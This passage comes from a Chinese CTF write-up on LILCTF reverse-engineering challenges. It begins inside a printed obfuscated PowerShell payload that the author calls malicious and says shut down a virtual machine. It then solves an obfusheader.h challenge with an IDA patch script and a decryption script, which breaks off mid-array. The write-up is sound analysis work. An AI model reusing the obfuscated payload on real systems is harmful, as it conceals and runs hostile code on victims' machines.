class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$l</span><span class="variable">$l</span><span class="variable">$i</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$u</span><span class="variable">$i</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$d</span><span class="variable">$e</span><span class="variable">$x</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$u</span><span class="variable">$i</span><span class="variable">$d</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$i</span><span class="variable">$z</span><span class="variable">$i</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$d</span><span class="variable">$q</span><span class="variable">$i</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$d</span><span class="variable">$d</span><span class="variable">$d</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>)  &quot;</span>  |  .<span class="variable">$r</span> </span><br></pre></td></tr></table></figure><p>这不是图片而是伪装的恶意powershell脚本，试了很多办法但还是没解密出,在虚拟机运行发现机器10分钟后自动关机并且有弹窗😣</p><p>于是在云沙箱再运行，终于成功了😭</p><p><img src="/2025/08/18/LILCTF-Re-Crypto/114514.png" alt="114514"></p><h2 id="obfusheader-h"><a href="#obfusheader-h" class="headerlink" title="obfusheader.h"></a>obfusheader.h</h2><p>混淆的威力如此大 <a href="https://github.com/ac3ss0r/obfusheader.h">https://github.com/ac3ss0r/obfusheader.h</a></p><p>没有好办法，动态调试</p><p>先把一堆花指令去除</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> ida_ua</span><br><span class="line"><span class="keyword">import</span> ida_segment</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch_jumps_to_nop</span>():</span><br><span class="line">    <span class="comment"># 遍历所有段</span></span><br><span class="line">    seg = ida_segment.get_first_seg()</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> seg:</span><br><span class="line">        start = seg.start_ea</span><br><span class="line">        end = seg.end_ea</span><br><span class="line">        ea = start</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ea &lt; end:</span><br><span class="line">            byte = ida_bytes.get_bytes(ea, <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span> byte == <span class="string">b&#x27;\x74\x01&#x27;</span>:</span><br><span class="line">                <span class="comment"># 将 74 改为 NOP</span></span><br><span class="line">                ida_bytes.patch_byte(ea, <span class="number">0x90</span>)</span><br><span class="line">                <span class="comment"># 重新生成指令</span></span><br><span class="line">                ida_ua.create_insn(ea)</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            ea += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        seg = ida_segment.get_next_seg(seg.start_ea)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;共修改 <span class="subst">&#123;count&#125;</span> 条 74 01 指令&quot;</span>)</span><br><span class="line"></span><br><span class="line">patch_jumps_to_nop()</span><br></pre></td></tr></table></figure><p>先找到一些关键的字符串下断点</p><p>这里输入字符串，字符串就存在byte_7FF698C0A040中，开始跟踪</p><p><img src="/2025/08/18/LILCTF-Re-Crypto/image-20250818091437565.png" alt="image-20250818091437565"></p><p>前几次动调发现输入的字数不对会输出“flag is too long!”或”flag is too short!”,最后猜出来flag长度是40</p><p>很久之后找出第一次加密逻辑</p><p><img src="/2025/08/18/LILCTF-Re-Crypto/image-20250818091908915.png" alt="image-20250818091908915"></p><p>每两个字节一组与16位随机数异或，可以把生成的随机数记录下来</p><p>很久之后找出第二次加密逻辑</p><p><img src="/2025/08/18/LILCTF-Re-Crypto/image-20250818092122009.png" alt="image-20250818092122009"></p><p>将每个字节的前后四位交换顺序</p><p>很久之后找出第三段加密逻辑</p><p><img src="/2025/08/18/LILCTF-Re-Crypto/image-20250818092452673.png" alt="image-20250818092452673"></p><p>逐字节按位取反</p><p>加密完成后终端会打印“Encryption done, time to compare!”</p><p>接下来找密文数组</p><p><img src="/2025/08/18/LILCTF-Re-Crypto/image-20250818092623830.png" alt="image-20250818092623830"></p><p>但是现在的密文并不是真正的，他需要经过一些变化才能得到</p><p><img src="/2025/08/18/LILCTF-Re-Crypto/image-20250818092736782.png" alt="image-20250818092736782"></p><p>得到真正的密文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x5C, 0xAF, 0xB0, 0x1C, 0xFC, 0xef, 0xc7, 0x8D, 0x1, 0xcf,</span><br><span class="line">0x0, 0x39, 0x94, 0xbc, 0x47, 0x2f, 0x0e, 0x7c, 0xa8, 0x8f,</span><br><span class="line">0x7f, 0xc9, 0xd2, 0xfa, 0xf8, 0x3f, 0x81, 0xfd, 0xa6, 0xaa,</span><br><span class="line">0x6, 0x1c, 0xcc, 0x7b, 0x40, 0xeb, 0x53, 0xdc, 0xdd, 0x1b</span><br></pre></td></tr></table></figure><p>完整的解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">ciphertext, xor_key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解密流程：</span></span><br><span class="line"><span class="string">    1. 与xor_key数组逐字节异或</span></span><br><span class="line"><span class="string">    2. 每个字节交换前4位和后4位</span></span><br><span class="line"><span class="string">    3. 逐字节取反</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 第一步：异或操作</span></span><br><span class="line">    xored = [c ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(ciphertext, xor_key)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二步：交换每个字节的高低4位</span></span><br><span class="line">    swapped = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> xored:</span><br><span class="line">        <span class="comment"># 将字节右移4位得到高4位，左移4位得到低4位，然后组合</span></span><br><span class="line">        high = (byte &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span></span><br><span class="line">        low = (byte &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xF0</span></span><br><span class="line">        swapped_byte = high | low</span><br><span class="line">        swapped.append(swapped_byte)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三步：逐字节取反</span></span><br><span class="line">    plaintext = [~b &amp; <span class="number">0xFF</span> <span class="keyword">for</span> b <span class="keyword">in</span> swapped]  <span class="comment"># 使用&amp;0xFF确保结果为1字节</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转换为字符串</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plaintext).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, xor_key</span>):</span><br><span class="line">    fan = [~b &amp; <span class="number">0xFF</span> <span class="keyword">for</span> b <span class="keyword">in</span> ciphertext]</span><br><span class="line">    swapped = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> fan:</span><br><span class="line">        <span class="comment"># 将字节右移4位得到高4位，左移4位得到低4位，然后组合</span></span><br><span class="line">        high = (byte &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span></span><br><span class="line">        low = (byte &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xF0</span></span><br><span class="line">        swapped_byte = high | low</span><br><span class="line">        swapped.append(swapped_byte)</span><br><span class="line">    plaintext= [c ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(swapped, xor_key)]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plaintext).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 密文</span></span><br><span class="line">    ciphertext = [</span><br><span class="line">        <span class="comment"># 0x5C, 0x1C, 0x04, 0xA9, 0x4A, 0x58, 0x7F, 0x34, 0xBB, 0x74,</span></span><br><span class="line">        <span class="comment"># 0xBC, 0x84, 0x2A, 0x03, 0x87, 0xEE, 0xCC, 0xBF, 0x6C, 